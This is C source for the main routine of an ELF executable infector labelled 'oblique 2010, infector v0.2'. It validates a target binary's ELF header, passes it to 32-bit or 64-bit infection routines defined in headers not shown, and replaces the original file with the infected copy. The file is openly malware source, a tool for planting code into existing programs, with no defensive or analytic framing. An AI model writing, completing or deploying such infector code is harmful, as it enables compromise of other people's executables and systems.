/* oblique 2010
 */
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <elf.h>
#include <sys/stat.h>
#include "infector.h"
#include "common.h"


int main(int argc, char *argv[]) {
    int fd, fdout, res;
    struct stat st;
    char magic[EI_NIDENT];
    char tmpfile[] = "XXXXXX";


    if (argc != 2) {
        printf("oblique 2010\n");
        printf("infector v0.2\n\n");
        printf("usage: %s elf_file\n", argv[0]);
        return 1;
    }

    if (stat(argv[1], &st) == -1) {
        print_error(__FILE__, __LINE__-1, errno, "stat");
        return 1;
    }

    if ((fd = open(argv[1], O_RDONLY)) == -1) {
        print_error(__FILE__, __LINE__-1, errno, "open");
        return 1;
    }

    if ((fdout = mkstemp(tmpfile)) == -1) {
        print_error(__FILE__, __LINE__-1, errno, "mkstemp");
        close(fd);
        return 1;
    }

    if ((res = read(fd, magic, EI_NIDENT)) == -1) {
        print_error(__FILE__, __LINE__-1, errno, "read");
        goto _fatal;
    } else if (res != EI_NIDENT) {
        fprintf(stderr, "[-] File is too small\n");
        goto _fatal;
    }


    if (memcmp(magic, ELFMAG, SELFMAG) == 0) {
        if (magic[EI_CLASS] == ELFCLASS32) {
            if (infect_elf32(fd, fdout) == -1)
                goto _fatal;
        } else if (magic[EI_CLASS] == ELFCLASS64) {
            if (infect_elf64(fd, fdout) == -1)
                goto _fatal;
        } else {
            fprintf(stderr, "Unknown ELF class.\n");
            goto _fatal;
        }
    } else {
        fprintf(stderr, "File not ELF.\n");
        goto _fatal;
    }

    close(fd);
    close(fdout);

    printf("[+] Replace the original file\n");
    if (replace_file(tmpfile, argv[1], st) == -1) {
        unlink(tmpfile);
        return 1;
    }

    printf("[+] Done!\n");

    return 0;


_fatal:
    close(fd);
    close(fdout);
    unlink(tmpfile);
    return 1;
}
